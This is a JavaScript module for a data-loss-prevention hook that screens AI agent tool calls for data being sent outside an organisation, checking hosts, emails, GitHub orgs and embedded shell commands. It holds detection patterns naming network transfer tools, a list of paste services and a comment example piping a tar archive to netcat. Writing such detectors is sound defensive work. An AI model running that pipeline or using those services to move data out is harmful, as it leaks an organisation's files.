/**
 * MCP Tool DLP Handler
 *
 * The PreToolUse hook fires for every tool — including MCP tools (mcp__server__name),
 * the Agent/Task tool, WebFetch, and any custom tool. Bash/Write/Edit are routed
 * separately; this module handles everything else.
 *
 * Strategy:
 *   1. Classify the tool as write/send vs read-only by name pattern.
 *      Read-only tools (search, list, get, query) are always allowed.
 *   2. For write/send tools, recursively walk the input object and extract:
 *        • URLs and hostnames  → check against the allowlist
 *        • Email addresses     → check domain (must be @your-company.com)
 *        • GitHub repo refs    → check org against APPROVED_GITHUB_ORGS
 *        • Embedded shell cmds → run through Layer 1 semantic analyzer
 *        • File path arguments → flag if sensitive and destination is external
 *   3. Return findings to the hook, which decides BLOCK / Layer-2-defer / ALLOW.
 *
 * Coverage rationale: even if we don't know every MCP tool by name, the input-
 * inspection approach catches "data leaving the organization perimeter" wherever it
 * appears in the JSON tree.
 */

'use strict';

const { isApprovedHost, classifyDestinations } = require('./allowlist.js');
const { isSensitiveFile }                       = require('./patterns.js');
const { analyze: semanticAnalyze }              = require('./semantic-analyzer.js');
const { scanText, maxTier, tierLabel, isFailClosedTier, describeContent } = require('./content-scanner.js');

// ---------------------------------------------------------------------------
// Tool classification by name
// ---------------------------------------------------------------------------

const READ_PATTERNS = [
  /(?:^|_)(?:get|list|search|read|query|fetch|find|describe|inspect)(?:_|$)/i,
  /_grouped$/i,         // *_grouped → aggregation/reads
  /_status$/i,
  /_metadata$/i,
  /_count$/i,
];

const WRITE_PATTERNS = [
  /(?:^|_)(?:send|create|update|post|publish|push|upload|delete|edit|reply|comment|add|merge|fork|copy|move|rename|set|put|draft|schedule|navigate|click|fill|submit|execute|run|eval|change|respond|transition|link|watch|unwatch|invite|remove|archive)(?:_|$)/i,
  /_message$/i,
  /_attachment$/i,
  /_file$/i,
];

const READ_ONLY_TOOL_WHITELIST = new Set([
  // Tools known to be read-only even if their names look generic
  'WebFetch',           // Claude Code WebFetch is HTTP GET
  'Read', 'Glob', 'Grep', 'NotebookRead',
  'mcp__glean__memory',     // memory READ — write variant would be different
  'mcp__Claude_in_Chrome__read_page',
  'mcp__Claude_in_Chrome__get_page_text',
  'mcp__Claude_in_Chrome__read_console_messages',
  'mcp__Claude_in_Chrome__read_network_requests',
  'mcp__Claude_in_Chrome__list_connected_browsers',
  'mcp__Claude_in_Chrome__find',
  'mcp__Claude_in_Chrome__shortcuts_list',
]);

/**
 * @returns {"write"|"read"|"unknown"}
 */
function classifyTool(toolName) {
  if (READ_ONLY_TOOL_WHITELIST.has(toolName)) return 'read';

  // Take the last segment of an mcp__server__name string
  const last = toolName.includes('__') ? toolName.split('__').pop() : toolName;

  // Read patterns take precedence (e.g. search_threads is read, not write)
  if (READ_PATTERNS.some(p => p.test(last))) return 'read';
  if (WRITE_PATTERNS.some(p => p.test(last))) return 'write';
  return 'unknown';
}

// ---------------------------------------------------------------------------
// Input inspection — walk the tool_input tree
// ---------------------------------------------------------------------------

const URL_RE   = /https?:\/\/[^\s"']+/g;
const EMAIL_RE = /[\w.+-]+@[\w.-]+\.[a-z]{2,}/gi;
// Anchored to a real github.com reference — never a bare "word/word" path.
const REPO_RE  = /github\.com[/:]([\w.-]+)\/([\w.-]+?)(?:\.git)?(?=[\s"'),;:]|$)/gi;

// Does the text merely *mention* transfer tooling? (advisory signal only)
const MENTIONS_TOOLING =
  /\b(?:curl|wget|scp|rsync|gsutil|netcat|nc)\b|\bgh\s+(?:gist|repo)\b|\bgit\s+push\b|\bdocker\s+push\b|\bnpm\s+publish\b|\baws\s+s3\b/i;

// A segment is command-shaped when it STARTS with a transfer/network/encoding
// tool (optionally via sudo/env). Anything else is prose.
const COMMAND_HEAD =
  /^(?:sudo\s+|env\s+\S+=\S+\s+)*(?:curl|wget|scp|rsync|sftp|ftp|nc|ncat|gsutil|cat|base64|xxd|tar|gzip|bzip2|xz|zip|openssl|nslookup|dig|host)\b|^(?:sudo\s+)?(?:gh\s+(?:gist|repo)|git\s+(?:push|remote)|docker\s+push|npm\s+publish|aws\s+s3)\b/;

/**
 * Split free text into shell-ish segments and return only the command-shaped
 * ones. Splits on newlines, `;`, `&&` and `||` — deliberately NOT on a single
 * `|`, so a genuine pipeline (`tar czf - x | nc host 4444`) stays intact and is
 * analysed as one command.
 */
function extractCommandCandidates(text) {
  if (typeof text !== 'string' || !text) return [];
  const out = [];
  for (const raw of text.split(/\r?\n|;|&&|\|\|/)) {
    // strip markdown/quoting noise from the front (```bash, `, $, >, -, *, |)
    const seg = raw
      .replace(/^[\s>*\-+|]*/, '')
      .replace(/^`{1,3}(?:bash|sh|shell|console)?\s*/i, '')
      .replace(/^\$\s+/, '')
      .trim();
    if (!seg) continue;
    if (COMMAND_HEAD.test(seg)) out.push(seg);
  }
  return out;
}

// ---------------------------------------------------------------------------
// Primary destination extractors  (high-confidence per-tool knowledge)
//
// For tools where one specific parameter IS the destination (not just text
// that might contain a URL), we extract it explicitly and check it.
// ---------------------------------------------------------------------------

const APPROVED_GITHUB_ORGS    = ['your-org', 'your-org-dev'];
const COMPANY_EMAIL_DOMAINS   = ['your-company.com'];
const PASTE_SERVICE_HOSTS     = [
  'pastebin.com', 'hastebin.com', 'hste.be', 'paste.ee', 'dpaste.com',
  'ix.io', 'sprunge.us', 'rentry.co', 'telegra.ph', 'gist.github.com',
];

// Map of tool-name suffix → function that extracts primary destination
// (matched against the last segment of mcp__server__name)
const PRIMARY_DEST_EXTRACTORS = [
  // GitHub: owner/organization field IS the destination
  { pattern: /^(?:create_or_update_file|push_files|create_pull_request|delete_file|create_branch|update_pull_request|merge_pull_request|create_or_update_file|add_comment_to_pending_review)$/,
    extract: inp => ({ kind: 'github_org', value: inp.owner ?? inp.organization }) },

  { pattern: /^(?:create_repository|fork_repository)$/,
    extract: inp => ({
      kind: 'github_org',
      value: inp.organization ?? null,
      forced: !inp.private && !inp.organization,    // public + no org → personal account
    }) },

  // Email send / draft / reply — the recipients are the destination
  { pattern: /^(?:create_draft|send_email|send|reply|forward)$/,
    extract: inp => ({
      kind: 'emails',
      value: [].concat(inp.to ?? [], inp.cc ?? [], inp.bcc ?? []),
    }) },

  // Browser: navigate / file_upload → url is destination
  { pattern: /^(?:navigate|file_upload|upload_image)$/,
    extract: inp => ({ kind: 'url', value: inp.url ?? inp.target_url }) },
];

function extractPrimaryDestination(toolName, toolInput) {
  if (!toolInput || typeof toolInput !== 'object') return null;
  const last = toolName.includes('__') ? toolName.split('__').pop() : toolName;
  for (const { pattern, extract } of PRIMARY_DEST_EXTRACTORS) {
    if (pattern.test(last)) return extract(toolInput);
  }
  return null;
}

function checkPrimaryDestination(dest) {
  if (!dest) return null;

  switch (dest.kind) {
    case 'github_org': {
      if (dest.forced) {
        return { unapproved: true, label: 'public GitHub (personal account)' };
      }
      if (!dest.value) return null;
      const org = String(dest.value).toLowerCase();
      if (!APPROVED_GITHUB_ORGS.includes(org)) {
        return { unapproved: true, label: `github.com/${org} (unapproved org)` };
      }
      return { unapproved: false };
    }

    case 'emails': {
      const emails = (dest.value ?? []).filter(Boolean);
      const external = emails.filter(e => {
        const domain = String(e).split('@').pop().toLowerCase();
        return !COMPANY_EMAIL_DOMAINS.some(d => domain === d || domain.endsWith('.' + d));
      });
      if (external.length > 0) {
        return { unapproved: true, label: `external recipient(s): ${external.join(', ')}` };
      }
      return { unapproved: false };
    }

    case 'url': {
      if (!dest.value) return null;
      try {
        const host = new URL(dest.value).hostname.toLowerCase();
        if (PASTE_SERVICE_HOSTS.some(h => host === h || host.endsWith('.' + h))) {
          return { unapproved: true, label: `public paste service: ${host}` };
        }
        if (!isApprovedHost(host)) {
          return { unapproved: true, label: `unapproved host: ${host}` };
        }
        return { unapproved: false };
      } catch { return null; }
    }
  }
  return null;
}

/**
 * @typedef {Object} McpFindings
 * @property {string[]} unapprovedHosts
 * @property {string[]} unapprovedEmails       — emails outside @your-company.com
 * @property {string[]} unapprovedRepos        — repos outside approved orgs
 * @property {string[]} sensitiveFiles         — sensitive file paths in inputs
 * @property {string[]} embeddedExfilCommands  — shell commands in string values
 * @property {string[]} approvedDests          — recognised-internal destinations
 */

function inspectInput(toolInput) {
  const findings = {
    unapprovedHosts:        [],
    unapprovedEmails:       [],
    unapprovedRepos:        [],
    sensitiveFiles:         [],
    embeddedExfilCommands: [],
    advisoryMentions:      [],   // prose that mentions tooling — never blocks
    approvedDests:          [],
    contentTier:            'none',
    contentFindings:        [],
  };

  walk(toolInput, findings);

  // De-duplicate the array fields (leave scalar contentTier alone)
  for (const k of Object.keys(findings)) {
    if (Array.isArray(findings[k])) findings[k] = [...new Set(findings[k])];
  }
  return findings;
}

function walk(value, findings) {
  if (value == null) return;
  if (typeof value === 'string') return inspectString(value, findings);
  if (Array.isArray(value))      return value.forEach(v => walk(v, findings));
  if (typeof value === 'object') return Object.values(value).forEach(v => walk(v, findings));
}

function inspectString(s, findings) {
  // 1. URLs
  for (const url of s.match(URL_RE) ?? []) {
    try {
      const host = new URL(url).hostname;
      if (host === 'github.com' || host === 'raw.githubusercontent.com') continue;
      if (isApprovedHost(host)) findings.approvedDests.push(host);
      else                       findings.unapprovedHosts.push(host);
    } catch { /* malformed */ }
  }

  // 2. Email addresses — anything not @your-company.com is suspect
  for (const email of s.match(EMAIL_RE) ?? []) {
    const domain = email.split('@').pop().toLowerCase();
    if (domain !== 'your-company.com' && !domain.endsWith('.your-company.com')) {
      findings.unapprovedEmails.push(email);
    }
  }

  // 3. GitHub repos — must be anchored to an actual github.com reference.
  //
  // A bare `word/word` token is NOT a repo. The previous version matched any
  // such token whenever the string mentioned "github" anywhere, so ordinary
  // file paths (dlp/allowlist.js, test/run-tests.sh, .github/workflows/ci.yml)
  // were all reported as unapproved repositories.
  let m;
  REPO_RE.lastIndex = 0;
  while ((m = REPO_RE.exec(s)) !== null) {
    const org = m[1].toLowerCase();
    if (!APPROVED_GITHUB_ORGS.includes(org)) {
      findings.unapprovedRepos.push(`${m[1]}/${m[2]}`);
    }
  }

  // 4. File paths — heuristic: tokens with directory separators or .ext
  for (const path of s.match(/(?:^|\s|=)([./\w-]+\/[\w./-]+|\b[\w-]+\.[a-z]{2,6}\b)(?=\s|$|"|')/g) ?? []) {
    const clean = path.replace(/^[\s=]+/, '');
    if (isSensitiveFile(clean)) findings.sensitiveFiles.push(clean);
  }

  // 5. Embedded shell commands.
  //
  // Only text that is COMMAND-SHAPED is analysed as a command — i.e. a segment
  // that *begins* with a transfer/network tool. Running the analyser over a
  // whole free-text blob produced false positives on any document that merely
  // discusses these tools (a README, a policy doc, a Jira ticket, a markdown
  // table), because the pipeline patterns would join tokens across unrelated
  // lines. Prose mentions are recorded as a non-blocking advisory instead.
  const candidates = extractCommandCandidates(s);
  for (const cand of candidates) {
    const result = semanticAnalyze(cand);
    if (result.is_exfil && (result.risk === 'high' || result.risk === 'medium')) {
      findings.embeddedExfilCommands.push(`${result.reason}: ${cand.slice(0, 100)}`);
    }
  }
  if (candidates.length === 0 && MENTIONS_TOOLING.test(s)) {
    findings.advisoryMentions.push(s.slice(0, 120));
  }

  // 6. Content classification — secrets, PII, classification markers
  //    inside the body/text of the tool call (e.g. an email body or Slack message)
  const content = scanText(s);
  if (content.tier !== 'none') {
    findings.contentTier = maxTier(findings.contentTier, content.tier);
    findings.contentFindings.push(...content.findings);
  }
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

/**
 * @returns {{ verdict: "block"|"defer"|"allow", severity: "high"|"medium",
 *             reason: string, findings: McpFindings }}
 */
function evaluateMcpCall(toolName, toolInput) {
  const opType = classifyTool(toolName);

  // Read-only tools are always allowed
  if (opType === 'read') {
    return { verdict: 'allow', severity: 'low', reason: 'read-only tool', findings: null };
  }

  // ── Primary-destination check  (high confidence) ────────────────────────
  // For tools where one specific parameter IS the destination (github owner,
  // email recipient, browser URL), an unapproved value alone is sufficient
  // to block — no need to also find sensitive content.
  const primaryDest = extractPrimaryDestination(toolName, toolInput);
  const primaryCheck = checkPrimaryDestination(primaryDest);
  if (primaryCheck?.unapproved) {
    const findings = inspectInput(toolInput);
    findings.primaryDest = primaryCheck.label;
    const failClosed = isFailClosedTier(findings.contentTier);
    return {
      verdict: 'block', severity: 'high', failClosed,
      reason: `${toolName} → ${primaryCheck.label}` +
              (failClosed ? ` (carrying ${tierLabel(findings.contentTier)})` : ''),
      findings,
    };
  }

  const findings = inspectInput(toolInput);
  findings.primaryDest = primaryCheck ? '(approved)' : null;

  // ── Secondary signals  (auxiliary content in tool inputs) ───────────────

  // Shell exfil commands embedded inside any string parameter
  if (findings.embeddedExfilCommands.length > 0) {
    return {
      verdict: 'block', severity: 'high',
      reason: `${toolName} input contains an embedded exfiltration command`,
      findings,
    };
  }

  // Auxiliary external destinations + sensitive file references
  const hasExternalTarget =
       findings.unapprovedHosts.length  > 0
    || findings.unapprovedEmails.length > 0
    || findings.unapprovedRepos.length  > 0;

  const hasSensitive = findings.sensitiveFiles.length > 0;
  const contentTier  = findings.contentTier || 'none';

  // CUSTOMER DATA / RESTRICTED content heading to an external destination →
  // hard block, fail-closed (matches Confluence policy: a single RESTRICTED or
  // public-internet factor sets the severity floor on its own).
  if (hasExternalTarget && isFailClosedTier(contentTier)) {
    return {
      verdict: 'block', severity: 'high', failClosed: true,
      reason: `${toolName} routing ${tierLabel(contentTier)} content to an unapproved external destination`,
      findings,
    };
  }

  if (hasExternalTarget && (hasSensitive || contentTier === 'confidential')) {
    return {
      verdict: 'block', severity: 'high',
      reason: `${toolName} routing ${contentTier === 'confidential' ? 'CONFIDENTIAL content' : 'sensitive file(s)'} to an unapproved external destination`,
      findings,
    };
  }

  // External target alone in auxiliary content → escalate to Layer 2
  if (hasExternalTarget) {
    return {
      verdict: 'defer', severity: 'medium',
      reason: `${toolName} references an unapproved external destination — needs intent check`,
      findings,
    };
  }

  if (opType === 'unknown') {
    return { verdict: 'allow', severity: 'low', reason: 'unknown tool, no exfil signal', findings };
  }

  return { verdict: 'allow', severity: 'low', reason: 'all destinations on allowlist', findings };
}

/**
 * Build a human-readable block message body for a finding.
 */
function describeFindings(toolName, findings) {
  const lines = [`Tool: ${toolName}`];
  if (findings.unapprovedHosts.length)
    lines.push(`Unapproved hosts:   ${findings.unapprovedHosts.join(', ')}`);
  if (findings.unapprovedEmails.length)
    lines.push(`Unapproved emails:  ${findings.unapprovedEmails.join(', ')}`);
  if (findings.unapprovedRepos.length)
    lines.push(`Unapproved repos:   ${findings.unapprovedRepos.join(', ')}`);
  if (findings.sensitiveFiles.length)
    lines.push(`Sensitive files:    ${findings.sensitiveFiles.join(', ')}`);
  if (findings.embeddedExfilCommands.length)
    lines.push(`Embedded commands:  ${findings.embeddedExfilCommands.join('; ')}`);
  if (findings.contentFindings && findings.contentFindings.length)
    lines.push(`Content detected:   ${describeContent(findings.contentFindings)}`);
  return lines.join('\n');
}

module.exports = { classifyTool, inspectInput, evaluateMcpCall, describeFindings };
